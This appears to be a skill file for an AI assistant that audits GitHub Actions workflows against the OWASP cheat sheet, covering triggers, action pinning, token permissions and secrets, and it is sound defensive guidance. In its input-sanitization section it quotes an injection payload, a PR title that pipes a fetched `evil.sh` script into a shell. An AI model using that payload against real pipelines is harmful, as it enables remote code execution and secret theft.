---
name: github-actions-security-review
description: >
  Audits and hardens GitHub Actions workflows against the OWASP GitHub Actions Security Cheat
  Sheet: dangerous triggers (pull_request_target, workflow_run, issue_comment), unpinned or
  impostor third-party actions, GITHUB_TOKEN over-permissioning, script injection, secrets
  handling (static creds, secrets: inherit, masking, secret scanning, persist-credentials),
  artifact/cache poisoning, self-hosted runner risk, egress restriction, repo hardening,
  AI-assistant-in-CI/CD risk, and static analysis (CodeQL actions, Zizmor). Use whenever a user
  asks to review, audit, secure, or harden a GitHub Actions workflow or CI/CD pipeline; mentions
  .github/workflows, GITHUB_TOKEN, pull_request_target, workflow_run, self-hosted runners,
  action pinning, OIDC/trusted publishing, or Zizmor/CodeQL for Actions; or wants a new workflow
  written securely. Always run the Security Gate before returning Actions YAML, whether
  reviewing existing files or generating new ones.
---

# GitHub Actions Security Verification
### Based on the OWASP GitHub Actions Security Cheat Sheet

CI/CD pipelines hold long-lived credentials and a `GITHUB_TOKEN` that can have `write` access to
the repository. A compromised workflow is a compromised production system. This skill treats
GitHub Actions workflows as security-critical code and verifies them — or writes them — against
every check documented in the [OWASP GitHub Actions Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html).

The cheat sheet frames the risk around four outcomes, and every check below maps back to
preventing one of them:

1. **Secrets exfiltration** — long-lived credentials printed to logs, sent to an external
   endpoint, or embedded in an artifact via attacker-controlled code execution.
2. **`GITHUB_TOKEN` compromise** — a `write`-scoped token stolen or misused to modify repo
   contents, releases, or other GitHub resources.
3. **Cache/artifact poisoning** — malicious content injected into a shared cache or artifact
   that a later, more privileged workflow (e.g. a release pipeline) trusts and executes.
4. **Denial-of-wallet** — attacker-triggered pipeline runs that rack up cost against paid
   external services (e.g. LLM-based code review).

---

## Step 0 — Locate what to verify

```bash
# Workflow files
find .github/workflows -type f \( -name "*.yml" -o -name "*.yaml" \) 2>/dev/null

# Composite / local reusable actions (checked separately — same rules apply)
find .github/actions -type f -name "action.yml" -o -name "action.yaml" 2>/dev/null

# Dependency-update tooling, if present
find .github -maxdepth 1 -iname "dependabot.yml" -o -iname "renovate.json*" 2>/dev/null
```

If the user pasted a workflow inline or uploaded one, verify that file directly instead of
searching the filesystem. If nothing is found, ask whether they want to scaffold a new,
secure-by-default workflow instead — see Step 3.

---

## Step 1 — Run the Security Gate

For every workflow and composite action file found, check each row below. Read the linked
reference file for detection patterns and full remediation code before making a final call —
some of these require judgement (e.g. "is this third-party action trustworthy?"), not just a
grep.

### 🚫 CRITICAL — code-execution / secret-exfiltration risk. Do not certify a workflow as safe, and do not hand the user new YAML, while any of these are open.

| # | Control | OWASP section | Reference |
|---|---------|----------------|-----------|
| C1 | `pull_request_target` never checks out or executes untrusted PR head code | Avoid using the `pull_request_target` trigger | `references/dangerous-triggers.md` |
| C2 | `workflow_run` isn't used to escalate privilege on attacker-influenced input; prefer `workflow_call` | Avoid using the `workflow_run` trigger | `references/dangerous-triggers.md` |
| C3 | `issue_comment` workflows check actor authorization and check out an immutable commit SHA, never a branch/PR number | Use `issue_comment` trigger with extra care | `references/dangerous-triggers.md` |
| C4 | No untrusted context (`github.event.*`, PR titles, issue bodies, branch names, etc.) is interpolated directly into `run:`; it's passed through an intermediate `env:` var | Sanitize user input | `references/dangerous-triggers.md` |
| C5 | Every third-party action and reusable workflow is pinned to a **full-length commit SHA** (not a tag or branch), and the SHA is verified to belong to the claimed org/repo (no impostor commit) | Always pin all action and reusable workflow versions with a commit hash | `references/pinning-and-supply-chain.md` |
| C6 | Workflow sets `permissions: {}` at the top level and grants only the specific, minimal permissions needed at the job level | Minimize `GITHUB_TOKEN` permissions | This file, § Minimize `GITHUB_TOKEN` permissions |
| C7 | No reusable workflow call uses `secrets: inherit`; each required secret is passed explicitly | Eliminate `secrets: inherit` while reusing workflows | `references/secrets-and-tokens.md` |
| C8 | `actions/checkout` sets `persist-credentials: false` unless the job genuinely needs to `git push`/perform other authenticated git operations | `actions/checkout` should be used with `persist-credentials: false` | `references/secrets-and-tokens.md` |
| C9 | No static/hardcoded secret, API key, or token appears literally in workflow YAML | Secure handling of static credentials | `references/secrets-and-tokens.md` |
| C10 | Any AI assistant step (Claude Code, Copilot, an LLM-based reviewer/triager) is scoped to the minimum tools/actions it needs, and is never reachable — with `write`-scoped `GITHUB_TOKEN` or secrets in context — from a trigger an untrusted user can fire | Be careful with AI assistant running in CI/CD pipeline | `references/ai-assistants-and-input-sanitization.md` |

### ⚠️ STANDARD — defense-in-depth and hygiene. Warn and recommend; don't block on these alone.

| # | Control | OWASP section | Reference |
|---|---------|----------------|-----------|
| S1 | CodeQL `actions` scanning and/or Zizmor are enabled and run as a required status check on PRs, plus a scheduled scan | Enable static analysis for GitHub Actions workflows | `references/repo-and-runner-hardening.md` |
| S2 | Egress traffic from GitHub-hosted runners is monitored/restricted (e.g. Harden-Runner) | Restrict egress traffic from GitHub-hosted runners | `references/repo-and-runner-hardening.md` |
| S3 | Self-hosted runners aren't used on public repos; if they are, they're ephemeral, network-restricted, hold no persistent sensitive data, and external-contributor runs require manual approval | Use self-hosted runners with extra caution | `references/repo-and-runner-hardening.md` |
| S4 | Caching is disabled in release/publish workflows to prevent artifact/cache poisoning | Prevent artifact poisoning | `references/repo-and-runner-hardening.md` |
| S5 | Third-party actions are vetted: trusted/active author, multiple contributors, stable code, no excessive permission requests | Use third-party actions with caution | `references/pinning-and-supply-chain.md` |
| S6 | Dependabot/Renovate keeps actions current, with a cooldown (`cooldown` / `minimumReleaseAge`) before adopting new releases | Use automated dependency update tools | `references/pinning-and-supply-chain.md` |
| S7 | Deployments to production/critical environments require manual approval via a [GitHub Environment](https://docs.github.com/en/actions/how-tos/deploy/configure-and-manage-deployments/manage-environments) | Require approval for deployments or publications to critical environments | This file, § Deployment approval |
| S8 | Static long-lived cloud/registry credentials are replaced with OIDC-based short-lived tokens ("trusted publishing") wherever the provider supports it | Try to eliminate all static credentials from your workflows | `references/secrets-and-tokens.md` |
| S9 | If static credentials are unavoidable: passed at **step** level (not job level), preferring environment-scoped secrets, rotated regularly | Secure handling of static credentials | `references/secrets-and-tokens.md` |
| S10 | Sensitive values that aren't GitHub secrets are masked with `::add-mask::` before they can hit the log | Mask sensitive data | `references/secrets-and-tokens.md` |
| S11 | Secret scanning runs both pre-commit and on pull requests, failing the check on detection | Use secret scanning tools | `references/secrets-and-tokens.md` |
| S12 | Repository settings are hardened: `Require approval for all external contributors`, default `GITHUB_TOKEN` restricted to read-only at the repo/org level, branch protection requiring reviews + status checks + signed commits + `CODEOWNERS` | Harden repository settings | `references/repo-and-runner-hardening.md` |

Two OWASP recommendations are organizational rather than per-file checks, but raise them
whenever relevant: treat the CI/CD pipeline itself as critical production code (threat modeling,
secure code review, pen testing — see `references/repo-and-runner-hardening.md`), and have an
incident response plan in place for pipeline compromise before it's needed.

---

## Gate response format

When any CRITICAL item is open, lead with this before anything else in the response:

```
🚫 GitHub Actions Security Gate — NOT CLEAR

.github/workflows/release.yml

  [C5] Unpinned third-party action — actions-ecosystem/action-something@v2 is pinned to a
       mutable tag, not a commit SHA.
       OWASP: "Always pin all action and reusable workflow versions with a commit hash..."
       Risk: a compromised or malicious release of this action runs with this workflow's
       permissions and any secrets in scope.
       Fix: pin to the full commit SHA, e.g.
       uses: actions-ecosystem/action-something@a1b2c3d... # v2.1.0

  [C6] Missing default-deny permissions — no top-level `permissions:` block, so GITHUB_TOKEN
       gets the repository's default permissions (commonly read/write).
       OWASP: "Always set permissions: {} at the workflow level..."
       Fix: add `permissions: {}` at the top of the workflow and grant only what each job needs.

2 CRITICAL issues found. Resolve these before this workflow is safe to merge/run.
```

List every STANDARD finding after the CRITICAL section (or on its own if there are no CRITICAL
findings) as recommendations rather than blockers. If everything passes, say so plainly and
summarize the checks that were verified — don't manufacture findings to seem thorough.

---

## Step 2 — Category detail and patterns

### Minimize `GITHUB_TOKEN` permissions (C6)

Default-deny at the workflow level, then grant narrowly per job:

```yaml
permissions: {}

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps: [...]

  publish-release:
    runs-on: ubuntu-latest
    permissions:
      contents: write   # only the job that actually needs it
    steps: [...]
```

### Deployment approval (S7)

```yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    environment: production   # requires manual approval if configured with required reviewers
    permissions:
      contents: read
      id-token: write
    steps: [...]
```

Configure the required reviewers list under the repository's Environments settings — the
`environment:` key alone doesn't enforce approval, it just targets the environment whose rules
then apply.

### Sanitize user input (C4)

Never interpolate untrusted context straight into a shell step — GitHub expands
`${{ ... }}` before the shell ever sees it, so attacker-controlled text (a PR title, issue body,
commit message, branch name) becomes literal shell syntax.

```yaml
# ❌ Vulnerable — a PR titled `"; curl evil.sh | sh #` runs arbitrary shell
- run: echo "Building PR: ${{ github.event.pull_request.title }}"

# ✅ Safe — the value is passed as data through an env var, not spliced into the script
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building PR: $PR_TITLE"
```

Apply this consistently even for contexts that look "safe" (e.g. `github.repository`) — it costs
nothing and removes the need to reason about which contexts are attacker-influenced today versus
tomorrow.

---

## Step 3 — Writing new workflows

When asked to scaffold a workflow rather than audit one, apply every CRITICAL control from the
gate by construction: `permissions: {}` at the top, pinned-by-SHA actions, `persist-credentials:
false` on checkout unless push access is required, no `secrets: inherit`, sanitized context
handling, and OIDC over static credentials wherever the target (cloud provider, package
registry) supports trusted publishing. Then run the same gate against the result before handing
it back — generated code gets no exemption from verification.

---

## Reference files

| File | Read when |
|------|-----------|
| `references/dangerous-triggers.md` | Any workflow uses `pull_request_target`, `workflow_run`, or `issue_comment`, or writes/reviews a fork-facing PR workflow |
| `references/pinning-and-supply-chain.md` | Third-party actions/reusable workflows are used; setting up or reviewing Dependabot/Renovate |
| `references/secrets-and-tokens.md` | Any workflow touches secrets, cloud/registry credentials, `actions/checkout`, or reusable-workflow secret passing |
| `references/repo-and-runner-hardening.md` | Reviewing repo settings, self-hosted runners, static analysis (CodeQL/Zizmor) setup, or release/publish workflows (cache poisoning) |
| `references/ai-assistants-and-input-sanitization.md` | A workflow runs an AI assistant/LLM step (code review, issue triage, auto-reply bots) |
